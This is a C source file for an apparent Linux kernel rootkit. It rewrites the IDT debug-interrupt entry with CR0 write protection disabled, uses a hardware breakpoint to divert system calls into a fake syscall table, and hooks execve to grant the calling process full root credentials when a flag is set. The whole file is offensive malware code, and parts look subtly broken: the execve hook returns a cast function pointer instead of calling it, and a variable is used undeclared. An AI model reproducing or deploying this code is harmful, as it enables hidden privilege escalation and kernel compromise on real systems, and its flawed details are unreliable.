#include "syscall_table.h"
#include "hook.h"
#include "dr_breakpoints.h"

typedef asmlinkage long (*t_syscall)(const struct pt_regs *);

#define SYSCALL(sys) (t_syscall)sct[__NR_##sys]
#define HOOK(sys, func) fake_sct[__NR_##sys] = (unsigned long)func

static unsigned long fake_sct[320];
static unsigned long *sct;

/* set root escalation flag */
int is_root = 0;

unsigned int do_debug_v = DO_DEBUG_VECTOR;
gate_desc old_gate_entry;

/*
 * rax -> fake_sct index
 */
void my_do_debug(struct pt_regs *regs)
{
  unsigned long off = ((unsigned long)fake_sct - (unsigned long)sct);
  regs->ax += off / sizeof(unsigned long);
}

void my_debug(void)
{
  asm("mov %rsp,%rdi\n"
	  "1: call my_do_debug\n"
	  "iretq");
}

int patch_idt(void)
{
  struct desc_ptr idtr;
  gate_desc new_gate_ptr;
  unsigned long cr0;
  
  store_idt(&idtr);

  memcpy(&old_gate_entry, (void *) (idtr.address + do_debug_v * sizeof(gate_desc)), sizeof(gate_desc));
  pack_gate(&new_gate_ptr, GATE_INTERRUPT, (unsigned long)my_debug, 0x3, 0, 0);

  /* IDT is read only */
  cr0 = read_cr0();
  write_cr0(cr0 & ~X86_CR0_WP);
  write_idt_entry((gate_desc *)idtr.address, do_debug_v, &new_gate_ptr);
  write_cr0(cr0);
  
  return 0;
}

static asmlinkage int new_sys_execve(const struct pt_regs *pt_regs)
{
  if (is_root == 1) {

	/* generating root permissions */
	struct cred *np;
	np = prepare_creds();

	np->uid.val = np->gid.val = 0;
	np->euid.val = np->egid.val = 0;
	np->suid.val = np->sgid.val = 0;
	np->fsuid.val = np->fsgid.val = 0;

	/* commit creds to task_struct of current process */
	commit_creds(np);
  }
  return (int)SYSCALL(execve);
}

int hook_syscall_table(void)
{
  unsigned long gd_addr;

  table_ptr = sys_call_table_retrieve();
  sct = (unsigned long *)table_ptr;
  if (!sct)
	return -1;

  memcpy(fake_sct, sct, sizeof(fake_sct));

  HOOK(execve, new_sys_execve);

  unsigned long call_sys_addr = get_syscall_64_addr();
  if (!call_sys_addr)
	return -ENXIO; // set errno to "no such device or address"
  gd_addr = get_gadget_addr((void *)call_sys_addr);
  if (!gd_addr)
	return -ENXIO; // set errno to "no such device or address"

  debug_print("Registering hardware breakpoint at %p", (void *)gd_addr);
  
  reg_dr_bp(gd_addr, DR_RW_X, 0);

  return 0;
}
